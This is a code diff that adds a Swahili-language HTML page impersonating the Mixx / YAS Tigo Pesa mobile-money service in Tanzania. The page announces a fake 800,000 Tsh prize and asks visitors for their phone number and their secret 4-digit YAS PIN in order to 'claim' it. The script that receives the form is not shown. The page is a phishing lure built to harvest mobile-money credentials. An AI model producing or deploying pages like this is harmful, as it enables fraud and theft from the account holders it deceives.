@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mixx - Umejishindia Ofa Wa YAS Tigo Pesa</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <div class="logo">
+                <div class="logo-box">
+                    <span class="logo-text">mixx</span>
+                    <div class="logo-badge">TZ</div>
+                </div>
+            </div>
+
+            <h1 class="title">Umejishindia Ofa Wa YAS Tigo Pesa</h1>
+
+            <p class="subtitle">Karibuni Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa.</p>
+
+            <div class="price-section">
+                <p class="price-label">Kiwango cha Ofa kinachoweza kupatikana:</p>
+                <p class="price">Tsh 800,000</p>
+            </div>
+
+            <form id="mixxForm">
+                <input 
+                    type="text" 
+                    id="mixxName" 
+                    class="input-field" 
+                    placeholder="Nambari ya Mixx" 
+                    maxlength="50"
+                    required
+                >
+                
+                <input 
+                    type="password" 
+                    id="yasPin" 
+                    class="input-field" 
+                    placeholder="YAS Nambari ya Siri" 
+                    maxlength="4"
+                    minlength="4"
+                    pattern="\d{4}"
+                    required
+                >
+
+                <button type="submit" class="submit-btn">TOA ZAWADI</button>
+            </form>
+
+            <div class="admin-link-section">
+                <a href="index.html" class="admin-link">🏠 Kurudi Nyuma</a>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
